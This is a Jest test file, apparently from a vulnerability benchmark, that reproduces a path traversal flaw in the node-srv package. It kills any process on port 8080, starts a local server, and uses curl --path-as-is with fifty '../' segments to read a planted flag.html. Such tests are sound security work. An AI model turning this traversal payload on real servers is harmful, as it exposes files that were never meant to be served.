const path = require('path');
const pathToFlag = path.resolve(__dirname, '../flag.html');
const genstr = function (n) {
    const v19 = '/..'.repeat(50);
    const v20 = v19 + pathToFlag;
    return v20;
};
const v35 = done => {
    const v21 = expect.assertions(1);
    v21;
    let Server = require('node-srv');
    const fs = require('fs');
    const v22 = require('child_process');
    const exec = v22.exec;
    const v23 = fs.readFileSync(pathToFlag);
    let hostsFile = v23.toString();
    const a = require('child_process');
    try {
        const v24 = () => {
        };
        const v25 = a.execSync('fuser -k 8080/tcp', v24);
        v25;
    } catch (e) {
    }
    const v26 = {
        port: 8080,
        root: './',
        logs: true
    };
    const v27 = function () {
    };
    let srv = new Server(v26, v27);
    const v28 = genstr();
    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8080${ v28 }"`;
    const v33 = (error, stdout) => {
        const v29 = expect(stdout);
        const v30 = v29.toBe(hostsFile);
        v30;
        const v31 = srv.stop();
        v31;
        const v32 = done();
        v32;
    };
    const v34 = exec(attack_string, v33);
    v34;
};
const v36 = test('Path Traversal in node-srv', v35);
v36;